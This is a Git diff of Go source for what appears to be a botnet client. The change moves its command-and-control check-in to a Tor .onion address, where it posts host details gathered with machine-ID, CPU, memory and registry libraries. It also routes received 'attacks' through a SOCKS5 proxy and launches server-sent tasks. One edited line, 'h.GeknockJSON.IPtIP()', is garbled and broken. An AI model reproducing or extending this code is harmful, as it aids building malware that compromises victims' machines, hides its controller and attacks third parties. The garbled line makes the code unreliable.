@@ -4,15 +4,16 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"github.com/denisbrodbeck/machineid"
-	"github.com/klauspost/cpuid"
-	"github.com/pbnjay/memory"
-	"golang.org/x/sys/windows/registry"
 	"io/ioutil"
 	"net/http"
 	"os/user"
 	"strings"
 	"time"
+
+	"github.com/denisbrodbeck/machineid"
+	"github.com/klauspost/cpuid"
+	"github.com/pbnjay/memory"
+	"golang.org/x/sys/windows/registry"
 )
 
 type Handler struct {
@@ -21,10 +22,10 @@ type Handler struct {
 	knockJSON KnockJSON
 }
 
-func (h *Handler) Init(config Config, tag string) error {
+func (h *Handler) Init(config Config) error {
 	h.config = config
 
-	err := h.GetIP()
+	err := h.GeknockJSON.IPtIP()
 	if err != nil {
 		return err
 	}
@@ -46,7 +47,7 @@ func (h *Handler) Init(config Config, tag string) error {
 	errorChan := make(chan error)
 	go func() {
 		for {
-			err := h.Do(config.userAgent, tag)
+			err := h.Do(config.userAgent, fmt.Sprintf("socks5://%s:8001", h.knockJSON.IP))
 			if err != nil {
 				errorChan <- err
 				return
@@ -57,14 +58,14 @@ func (h *Handler) Init(config Config, tag string) error {
 	return <-errorChan
 }
 
-func (h *Handler) Do(userAgent, tag string) error {
+func (h *Handler) Do(userAgent, proxy string) error {
 	jsonBytes, err := json.Marshal(h.knockJSON)
 	if err != nil {
 		return err
 	}
 	postData := bytes.NewBuffer(jsonBytes)
 	request, err := http.NewRequest("POST",
-		fmt.Sprintf("http://%s:88/api/docking/knock", h.config.domain), postData)
+		fmt.Sprintf("http://%s.onion/api/docking/knock", h.config.torID), postData)
 	if err != nil {
 		return err
 	}
@@ -93,7 +94,7 @@ func (h *Handler) Do(userAgent, tag string) error {
 		go ParseTask(task)
 	}
 	for _, attack := range jsonResponse.Attacks {
-		go ParseAttack(attack, h.config, tag)
+		go ParseAttack(attack, h.config, proxy)
 	}
 	return nil
 }
